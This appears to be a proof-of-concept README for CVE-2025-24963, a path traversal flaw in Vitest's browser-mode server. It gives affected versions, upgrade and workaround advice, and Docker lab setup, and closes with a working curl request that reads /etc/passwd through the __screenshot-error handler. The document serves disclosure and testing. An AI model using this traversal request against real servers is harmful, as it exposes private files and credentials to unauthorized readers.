# CVE-2025-24963 - Vitest Browser Mode - Local File Read

​CVE-2025-24963 is a medium-severity vulnerability (CVSS 3.1 score: 5.9) affecting the `@vitest/browser` package, a component of the Vitest testing framework powered by Vite. This vulnerability arises from improper input validation in the `__screenshot-error` handler of the browser mode HTTP server. When the server is exposed to the network using the configuration option browser.api.host: true, an attacker can send specially crafted requests to access arbitrary files on the server's file system, potentially leading to unauthorized disclosure of sensitive information.

## Affected Versions
The vulnerability affects the following versions of `@vitest/browser`:​

- 2.0.4 to 2.1.8
- 3.0.0 to 3.0.3​

## Mitigation
This issue has been addressed in versions 2.1.9 and 3.0.4. Users are strongly advised to upgrade to these or later versions to mitigate the vulnerability.​

## Workaround
If immediate upgrading is not feasible, a temporary workaround is to avoid exposing the browser mode server to the network by not setting `browser.api.host: true` in your configuration. This will prevent external access to the vulnerable handler.

## Prepare Environment

```
git clone https://github.com/0xdeviner/CVE-2025-24963.git
cd CVE-2025-24963/vitest-vuln-demo
docker build -t vitest-cve-2025-24963 .
docker run -itd --name vitest-cve -p 63315:63315 vitest-cve-2025-24963
```

> Note: The port Vitest uses is dynamic (e.g., 63315). You may want to monitor the logs and adjust your -p flag accordingly.

## Exploit

```bash
curl "http://<IP>:63315/__screenshot-error?file=../../../../../../etc/passwd"
```
